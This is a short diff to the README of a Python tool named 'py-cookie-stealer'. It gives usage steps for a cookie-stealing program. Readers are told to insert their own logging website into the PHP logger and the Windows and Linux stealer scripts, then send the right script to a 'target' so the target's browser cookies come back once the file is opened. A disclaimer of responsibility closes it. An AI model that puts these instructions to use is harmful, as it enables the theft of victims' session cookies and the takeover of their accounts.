@@ -6,3 +6,6 @@ A simple python tool for stealing cookie from browser
 - cd py-cookie-stealer
 - add your website on cookie-logger.php and in linux-cookie-stealer.py, win-cookie-stealer.py
 - if your target is using windows means send the win-cookie-stealer to your target after he opens it you will get the cookie
+- if your target is using linux means send the linux-cookie-stealer.py
+
+# Tool author will not be responsible for any damage
